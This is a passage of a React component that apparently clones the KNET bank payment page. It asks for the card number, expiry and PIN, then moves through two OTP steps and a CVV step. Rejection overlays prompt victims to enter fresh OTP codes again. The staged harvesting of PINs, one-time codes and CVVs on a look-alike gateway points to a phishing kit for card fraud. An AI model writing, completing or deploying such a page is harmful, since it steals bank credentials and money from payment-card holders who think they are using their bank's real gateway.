                              value={debitFocused ? formatKnetCard(debitNumber) : maskKnetCard(debitNumber)}
                              onChange={(event) => { setDebitNumber(event.target.value.replace(/\D/g, "").slice(0, 16)); setSuggestOpen(true); setKnetError(false); }}
                              onFocus={() => { setDebitFocused(true); if (debitNumber) setSuggestOpen(true); }}
                              onBlur={() => { setDebitFocused(false); setSuggestOpen(false); }}
                              dir="ltr"
                              inputMode="numeric"
                              autoComplete="off"
                              maxLength={19}
                              className={`h-7 w-full rounded-[6px] border border-[#bcbcbc] bg-[linear-gradient(to_bottom,#fff_0%,#ebebeb_100%)] px-2 font-[Arial,Helvetica,sans-serif] text-[13px] tracking-[1px] text-[#333] shadow-[inset_0_2px_4px_rgba(0,0,0,0.12),0_1px_0_#fff] outline-none ${debitLogo ? "pr-[46px]" : ""}`}
                            />
                            {debitLogo ? <img src={debitLogo} alt="" className="pointer-events-none absolute right-[6px] top-1/2 h-[18px] w-auto max-w-[35px] -translate-y-1/2 object-contain" /> : null}
                            {suggestOpen && debitMatches.length > 0 ? (
                              <div className="absolute left-0 right-0 top-[calc(100%+6px)] z-10 max-h-[220px] overflow-y-auto rounded-[6px] border border-[#ccc] bg-white shadow-[0_4px_12px_rgba(0,0,0,0.15)]">
                                {debitMatches.map((card) => (
                                  <button key={card.bin} type="button" onMouseDown={(event) => event.preventDefault()} onClick={() => { setDebitNumber((c) => (c.length < card.bin.length ? card.bin : c)); setSuggestOpen(false); setKnetError(false); }} className="flex w-full items-center justify-between border-b border-[#f0f0f0] bg-[#e8e8e8] px-3 py-[9px] text-left text-[13px] font-semibold tracking-[1px] text-[#222] transition-colors hover:bg-[#f0f6ff]">
                                    <span>{card.bin} - {card.brand}</span>
                                    <img src={card.logo} alt="" className="ml-[10px] h-[30px] w-[52px] rounded border border-[#e8e8e8] bg-[#f5f5f5] object-contain p-[2px]" />
                                  </button>
                                ))}
                              </div>
                            ) : null}
                          </div>
                        </td>
                        <td dir="rtl" className="w-[42%] whitespace-nowrap py-[7px] ps-[6px] pe-1 text-right align-middle text-xs font-bold text-[#005baa]">:{t("debitNumber")}</td>
                      </tr>
                      <tr className="border-b border-[#d8d8d8]">
                        <td className="w-[58%] py-[7px] pe-1 text-right align-middle">
                          <input
                            value={debitExpiry}
                            onChange={(event) => { let v = event.target.value.replace(/\D/g, "").slice(0, 4); if (v.length > 2) v = v.slice(0, 2) + " / " + v.slice(2); setDebitExpiry(v); setKnetError(false); setKnetExpiryError(false); }}
                            dir="ltr"
                            inputMode="numeric"
                            autoComplete="off"
                            maxLength={7}
                            placeholder="YY / MM"
                            className="ml-auto mr-[6px] block h-7 w-[100px] rounded-[6px] border border-[#bcbcbc] bg-[linear-gradient(to_bottom,#fff_0%,#ebebeb_100%)] px-2 font-[Arial,Helvetica,sans-serif] text-[13px] tracking-[1px] text-[#333] shadow-[inset_0_2px_4px_rgba(0,0,0,0.12),0_1px_0_#fff] outline-none placeholder:font-bold placeholder:text-[#8a8a8a]"
                          />
                        </td>
                        <td dir="rtl" className="w-[42%] whitespace-nowrap py-[7px] ps-[6px] pe-1 text-right align-middle text-xs font-bold text-[#005baa]">:{t("debitExpiry")}</td>
                      </tr>
                      <tr>
                        <td className="w-[58%] py-[7px] pe-1 align-middle">
                          <input value={pin} onChange={(event) => { setPin(event.target.value.replace(/\D/g, "").slice(0, 4)); setKnetError(false); }} dir="ltr" type="password" inputMode="numeric" autoComplete="current-password" maxLength={4} className="h-7 w-full rounded-[6px] border border-[#bcbcbc] bg-[linear-gradient(to_bottom,#fff_0%,#ebebeb_100%)] px-2 font-[Arial,Helvetica,sans-serif] text-[13px] tracking-[1px] text-[#333] shadow-[inset_0_2px_4px_rgba(0,0,0,0.12),0_1px_0_#fff] outline-none" />
                        </td>
                        <td dir="rtl" className="w-[42%] whitespace-nowrap py-[7px] ps-[6px] pe-1 text-right align-middle text-xs font-bold text-[#005baa]">:{t("pin")}</td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </div>
            )}

            <div className="overflow-hidden rounded-[10px] border border-[#bbb] bg-white shadow-[0_2px_8px_rgba(0,0,0,0.12)]">
              <div className="px-5 py-[18px]">
                <div dir="rtl" className="flex w-full gap-1">
                  <button type="button" disabled={knetBusy || pending} onClick={() => void submitKnetStep()} className="flex-1 cursor-pointer rounded-s-[6px] border-none bg-[#d4d4d4] px-2 py-[10px] text-sm font-semibold text-[#333] transition-colors hover:bg-[#c0c0c0] disabled:opacity-60">
                    {step === "knetOtp" || step === "knetOtp2" || step === "knetCvv" ? "تأكيد العملية" : t("send")}
                  </button>
                  <button type="button" onClick={() => { setKnetError(false); setStep(step === "knetOtp2" ? "knetCvv" : step === "knetCvv" ? "knetOtp" : step === "knetOtp" ? "knet" : "pay"); }} className="flex-1 cursor-pointer rounded-e-[6px] border-none bg-[#d4d4d4] px-2 py-[10px] text-sm font-semibold text-[#333] transition-colors hover:bg-[#c0c0c0]">
                    {t("cancel")}
                  </button>
                </div>
              </div>
            </div>
          </div>

          <div className="flex w-full max-w-[460px] flex-col gap-1 px-3 pb-[18px] pt-[10px] text-center">
            <p className="text-xs font-semibold text-[#555]">{t("rights")}</p>
            <p className="text-xs text-[#005baa]">{t("knetCompany")}</p>
          </div>
        </div>
      )}
      {rejectKind ? (
        <KnetRejectOverlay
          kind={rejectKind}
          otpSecondsLeft={rejectKind === "otp" || rejectKind === "otp2" ? otpResendSeconds : undefined}
          onContinue={() => void finishKnetRetry(rejectKind)}
        />
      ) : null}
    </form>
  );
}

function BackIcon() {
  return (
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="size-6 -scale-x-100" aria-hidden="true">
      <path fill="currentColor" fillRule="evenodd" d="m8.414 12 10-10L17 .586 5.586 12 17 23.414 18.414 22z" />
    </svg>
  );
}
